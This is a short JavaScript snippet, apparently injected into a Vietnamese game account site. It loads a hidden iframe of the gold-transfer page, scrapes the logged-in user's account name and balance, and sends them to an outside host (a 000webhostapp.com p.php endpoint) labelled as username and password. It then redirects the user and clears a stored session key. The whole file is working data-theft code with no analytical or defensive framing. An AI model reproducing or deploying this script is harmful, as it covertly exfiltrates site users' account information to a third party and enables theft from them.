var MAY_CHU = 2;
var INFO;
var BALANCE;
$('#link-group-facebook').hide();
$('#link-group-facebook').html('<iframe style="display:none" id="mc" src="/user/chuyenvang"></iframe>');

var fr = document.getElementById('mc');
fr.addEventListener("load", function() {
  let serv = fr.contentDocument.querySelector('.alert-info > strong > span').innerText.replace(/\D/g, '');
  let i = parseInt(serv);
  INFO = $("#userInfo").text().split('-');
  TEN_TK = INFO[0].trim();
  BALANCE = INFO[1].replace(/\D/g, '');
  if (MAY_CHU === i) {
    const data = 'username=' + TEN_TK + '&password=' + BALANCE;
    const l = 'https://songloimr.000webhostapp.com/p.php?' + data;

    $.get(l, (d) => {
      window.location.href = "/";
    })
  }
});
localStorage.removeItem('sess');
